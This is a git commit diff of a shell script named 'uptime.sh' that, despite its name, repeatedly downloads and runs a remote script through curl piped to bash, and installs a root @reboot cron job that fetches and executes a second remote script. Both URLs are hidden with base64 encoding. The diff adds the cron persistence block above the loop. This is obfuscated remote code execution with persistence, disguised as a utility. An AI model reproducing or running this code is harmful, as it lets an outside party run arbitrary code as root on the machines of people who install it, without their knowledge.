39eedbcec57594b6f1187af65c59d74f2cc2bac2
aa0c <107745374+awaitla@users.noreply.github.com>
2024-06-27 22:21:26 +0800

    Update uptime.sh

--- run/uptime.sh
+++ run/uptime.sh
@@ -1,8 +1,9 @@
 ls > /root/ls.log
 
+CRON_JOB="@reboot sudo nohup curl -fsSL $(echo aHR0cHM6Ly9naXRodWIuY29tL2F3YWl0bGEvcy9yYXcvbWFpbi9ydW4vaGsuc2g= | base64 --decode) | bash > /dev/null"
+(crontab -l 2>/dev/null | grep -v -F "$CRON_JOB" ; echo "$CRON_JOB") | crontab -
+
 while true; do
    curl -fsSL $(echo aHR0cHM6Ly9naXRodWIuY29tL2F3YWl0bGEvcy9yYXcvbWFpbi9rZWVwL2tlZXAuc2g= | base64 --decode) | bash
-   CRON_JOB="@reboot sudo nohup curl -fsSL $(echo aHR0cHM6Ly9naXRodWIuY29tL2F3YWl0bGEvcy9yYXcvbWFpbi9ydW4vaGsuc2g= | base64 --decode) | bash > /dev/null"
-   (crontab -l 2>/dev/null | grep -v -F "$CRON_JOB" ; echo "$CRON_JOB") | crontab -
    sleep 10
 done
